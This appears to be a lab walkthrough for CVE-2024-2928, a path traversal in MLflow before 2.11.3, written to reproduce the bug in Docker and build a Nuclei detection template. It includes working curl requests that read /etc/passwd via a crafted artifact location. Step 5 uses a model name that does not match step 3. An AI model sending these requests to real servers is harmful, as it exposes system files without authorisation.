

# CVE-2024-2928 - MLflow < 2.11.3 - Path Traversal

## Description

MLflow versions prior to `2.11.3` are vulnerable to a **Path Traversal** vulnerability due to improper handling of URI fragments in artifact locations. An attacker can exploit this to read arbitrary files from the server, including sensitive files like `/etc/passwd`.


## References:

* [NVD CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2024-2928)
* [Exploit Code](https://github.com/nuridincersaygili/CVE-2024-2928/blob/main/CVE-2024-2928.py)
* [Nuclei Official Template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-2928.yaml)


## Lab Setup

> Requires Docker installed

```bash
docker-compose up -d
```

The vulnerable MLflow application will run on:

```bash
http://<your-docker-ip>:5000
```


## Nuclei Command

```bash
nuclei -u http://192.168.1.172:5000 -t CVE-2024-2928.yaml
```

![1](https://github.com/user-attachments/assets/b106e672-0357-401a-9f54-a1a0dce74560)


# Exploitation Steps (Manual)

1. Create experiment with artifact location as /etc/:
```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/experiments/create \
  -H "Content-Type: application/json" \
  -d '{
        "name": "exploit123",
        "artifact_location": "http:///#/../../../../../../../../../../../../../..//etc/"
      }'
```

 - You should get experiment_id: 7 (for example)


2. Create run: (experiment_id request according change)

```
curl -s -X POST http://192.168.1.172:5000/api/2.0/mlflow/runs/create \
  -H "Content-Type: application/json" \
  -d '{"experiment_id": "7"}'
```
 - Note the run_id returned. Let's say: 3cfc250090b246b68f34fb2dfa42ba0e

3. Register model:

```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/registered-models/create \
  -H "Content-Type: application/json" \
  -d '{"name": "exploit123"}'
```

4. Create model version using directory as source: (Chage run_id according to request)

```
curl -s -X POST http://192.168.1.172:5000/ajax-api/2.0/mlflow/model-versions/create \
  -H "Content-Type: application/json" \
  -d '{
        "name": "exploit123",
        "run_id": "3cfc250090b246b68f34fb2dfa42ba0e",
        "source": "file:///etc/"
      }'
```

 - This should now succeed because /etc/ matches the artifact path.

5. Fetch /etc/passwd

```
curl -s "http://192.168.1.172:5000/model-versions/get-artifact?path=passwd&name=exploit1234&version=1"
```

# Steps to Write Nuclei Template

## Variables & Extractors

* No user-defined variables, random string (`{{randstr}}`) used for names
* Extracted fields:

  * `EXPERIMENT_ID` — From first response
  * `RUN_ID` — From second response


## Full Template Request Breakdown

### Request 1 — Create Experiment with Path Traversal

```yaml
POST /ajax-api/2.0/mlflow/experiments/create
{"name": "{{randstr}}", "artifact_location": "http:///#/../../../../../../../../../../../../etc/"}
```

Extract `EXPERIMENT_ID`


### Request 2 — Create Run

```yaml
POST /api/2.0/mlflow/runs/create
{"experiment_id": "{{EXPERIMENT_ID}}"}
```

Extract `RUN_ID`

### Request 3 — Create Model

```yaml
POST /ajax-api/2.0/mlflow/registered-models/create
{"name": "{{randstr}}"}
```


### Request 4 — Create Model Version with `/etc/` Source

```yaml
POST /ajax-api/2.0/mlflow/model-versions/create
{"name": "{{randstr}}", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}
```


### Request 5 — Exploit LFI by Reading `/etc/passwd`

```yaml
GET /model-versions/get-artifact?path=passwd&name={{randstr}}&version=1
```


## Matchers

```yaml
- Status code 200  
- Response body contains "root:.*:0:0:"  
- Response header confirms "filename=passwd" and "application/octet-stream"  
```


